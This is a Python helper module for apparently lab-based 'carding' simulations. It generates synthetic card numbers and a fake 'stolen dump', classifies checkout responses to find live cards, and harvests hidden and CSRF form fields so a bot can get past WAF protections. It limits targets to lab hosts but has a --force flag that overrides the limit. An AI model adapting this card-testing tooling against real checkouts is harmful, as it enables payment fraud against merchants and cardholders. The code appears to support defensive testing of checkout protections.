"""Shared helpers for the carding simulations.

Every card here is synthetic and every target is a lab checkout whose "issuer"
is a local fake. The dump generator mirrors the issuer's derivation of expiry
and CVV so records are internally consistent, which is what a real stolen dump
looks like. It deliberately does not reveal which cards are live -- only
submitting them tells you that, and that is exactly the question the checkout
form answers for free when it is left unprotected.
"""

import argparse
import hashlib
import hmac
import os
import random
import re
import sys
from html.parser import HTMLParser
from urllib.parse import urlparse

# Well-known test BIN prefixes. These are the ranges payment processors publish
# for sandbox use; none of them route to a real issuer.
TEST_BINS = ("411111", "424242", "511111", "555555", "601111")

ALLOWED_HOST_SUFFIXES = (".democuda.org", "localhost", "127.0.0.1")

APPROVED_MARKER = "Payment approved"
DECLINE_PATTERN = re.compile(r"code (\d{2})")
BLOCK_MARKERS = ("barracuda", "access denied", "request blocked", "blocked by")


def luhn_ok(pan):
    digits = [int(c) for c in pan]
    checksum = 0
    for index, digit in enumerate(reversed(digits)):
        if index % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        checksum += digit
    return checksum % 10 == 0


def generate_pan(rng, prefix=None, length=16):
    prefix = prefix or rng.choice(TEST_BINS)
    body = prefix + "".join(rng.choice("0123456789") for _ in range(length - len(prefix) - 1))
    for digit in "0123456789":
        if luhn_ok(body + digit):
            return body + digit
    raise RuntimeError("no valid check digit")


def derive_credentials(pan, secret):
    """Mirror of tekgear.issuer.Issuer.expected_credentials."""
    digest = hmac.new(secret.encode(), pan.encode(), hashlib.sha256).digest()
    month = digest[1] % 12 + 1
    year = 26 + digest[2] % 4
    cvv = int.from_bytes(digest[3:5], "big") % 1000
    return f"{month:02d}", f"{year:02d}", f"{cvv:03d}"


def build_dump(count, secret, seed=None):
    """A synthetic 'stolen dump': accurate records, unknown liveness."""
    rng = random.Random(seed)
    dump = []
    for _ in range(count):
        pan = generate_pan(rng)
        month, year, cvv = derive_credentials(pan, secret)
        dump.append({"pan": pan, "exp_month": month, "exp_year": year, "cvv": cvv})
    return dump


def classify(status, text):
    """Map a checkout response onto what the attacker actually learns.

    'blocked' and 'challenge' are the outcomes that matter once a WAF is in the
    path -- they are what a successful mitigation looks like from this side.
    """
    lowered = text.lower()
    if status in (401, 403, 406, 429) or any(m in lowered for m in BLOCK_MARKERS):
        return "blocked"
    if APPROVED_MARKER in text:
        return "approved"
    match = DECLINE_PATTERN.search(text)
    if match:
        return f"declined:{match.group(1)}"
    if status >= 500:
        return "error"
    return "challenge"


class _FormFields(HTMLParser):
    def __init__(self):
        super().__init__()
        self.fields = {}

    def handle_starttag(self, tag, attrs):
        if tag != "input":
            return
        attrs = dict(attrs)
        if attrs.get("name"):
            self.fields[attrs["name"]] = attrs.get("value", "")


def harvest_form_fields(html):
    """Return every input name/value on the checkout page.

    Carrying these forward is what lets a session-aware bot survive hidden-field
    and CSRF protections that a WAF injects into the form.
    """
    parser = _FormFields()
    parser.feed(html)
    return parser.fields


def guard_target(url, force=False):
    host = (urlparse(url).hostname or "").lower()
    if any(host == s or host.endswith(s) for s in ALLOWED_HOST_SUFFIXES):
        return
    if force:
        sys.stderr.write(
            f"WARNING: {host} is not a recognised lab host. Continuing because "
            f"--force was given. Only run this against systems you are authorised to test.\n"
        )
        return
    sys.exit(
        f"Refusing to run against {host!r}: not a lab host.\n"
        f"Allowed: {', '.join(ALLOWED_HOST_SUFFIXES)}. Use --force to override."
    )


def base_parser(description):
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument("--target", default="https://insecure.pay.democuda.org",
                        help="base URL of the checkout under test")
    parser.add_argument("--secret", default=os.environ.get("LAB_SECRET", "dev-only-insecure-default"),
                        help="LAB_SECRET of the target lab; seeds the synthetic dump")
    parser.add_argument("--count", type=int, default=200, help="number of cards to test")
    parser.add_argument("--seed", type=int, default=None, help="RNG seed for a reproducible dump")
    parser.add_argument("--timeout", type=float, default=10.0, help="per-request timeout in seconds")
    parser.add_argument("--out", default=None, help="write confirmed live cards to this JSON file")
    parser.add_argument("--force", action="store_true", help="run against a non-lab host")
    return parser


class Tally:
    """Running scoreboard printed by every tier."""

    def __init__(self):
        self.counts = {}
        self.live = []

    def add(self, outcome, record=None):
        self.counts[outcome] = self.counts.get(outcome, 0) + 1
        if outcome == "approved" and record:
            self.live.append(record)

    def summary(self, elapsed):
        parts = [f"{k}={v}" for k, v in sorted(self.counts.items())]
        total = sum(self.counts.values())
        rate = total / elapsed if elapsed > 0 else 0.0
        return (f"\n{total} attempts in {elapsed:.1f}s ({rate:.1f}/s)\n"
                f"  {'  '.join(parts)}\n"
                f"  live cards recovered: {len(self.live)}")


def save_live(path, live):
    if not path or not live:
        return
    import json
    with open(path, "w") as handle:
        json.dump(live, handle, indent=2)
    print(f"wrote {len(live)} live card(s) to {path}")
